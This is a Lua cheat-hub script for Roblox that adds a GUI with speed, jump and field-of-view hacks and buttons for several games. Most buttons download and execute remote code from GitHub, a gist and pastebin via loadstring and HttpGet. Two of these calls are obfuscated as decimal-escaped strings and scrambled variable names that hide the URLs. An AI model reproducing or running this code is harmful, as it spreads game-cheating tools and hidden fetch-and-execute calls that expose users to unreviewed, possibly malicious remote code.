local library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
local Wait = library.subs.Wait

local PepsisWorld = library:CreateWindow({
	Name = "RULZOUR",
	Themeable = {
		Info = "TEST HUB GUI"
	}
})

local GeneralTab = PepsisWorld:CreateTab({
	Name = "MAIN"
})
local ScriptPSection = GeneralTab:CreateSection({
	Name = "SCRIPT"
})
ScriptPSection:AddButton({
	Name = "Fly",
	Callback = function()
		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
	end
})


local MiscPSection = GeneralTab:CreateSection({
	Name = "MISC"


})
MiscPSection:AddSlider({
	Name = "WalkSpeed",
	Flag = "MiscPSection_WalkSpeed",
	Value = 16,
	Min = 0,
	Max = 999,
	Textbox = true,
	Callback = function(q)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = q
	end
})

MiscPSection:AddSlider({
	Name = "JumpHack",
	Flag = "MiscPSection_JumpHack",
	Value = 50,
	Min = 0,
	Max = 999,
	Textbox = true,
	Callback = function(w)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = w
	end
})

MiscPSection:AddSlider({
	Name = "FovHack",
	Flag = "MiscPSection_FovHack",
	Value = 60,
	Min = 0,
	Max = 999,
	Textbox = true,
	Callback = function(e)
		local FovNumber = e
		local Camera = workspace.CurrentCamera
		Camera.FieldOfView = e
	end
})

MiscPSection:AddButton({
	Name = "RKill",
	Callback = function()
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end
})


local ToolPSection = GeneralTab:CreateSection({
	Name = "Tool"
})

ToolPSection:AddButton({
	Name = "Infinite Yield FE V5.9.3",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	end
})

ToolPSection:AddButton({
	Name = "Keyboard PC In Mobile",
	Callback = function()
		SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
	end
})


local GeneralTab = PepsisWorld:CreateTab({
	Name = "SCRIPT"
})
local ScriptGSection = GeneralTab:CreateSection({
	Name = "GAMES"
})

ScriptGSection:AddButton({
	Name = "Pet Simulator X",
	Callback = function()
		getgenv().key = "projectWBIsAwesomeG8J7GJ678PY"
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Main.lua"))()
	end
})

ScriptGSection:AddButton({
	Name = "Bee Swarm Simulator",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Broshenka/BeeSwarmSimulatorScript/main/Bee%20Swarm%20Simulator.lua"))()
	end
})

ScriptGSection:AddButton({
	Name = "Blox Fruits",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
	end
})


--[[function (q,w,e,    )]]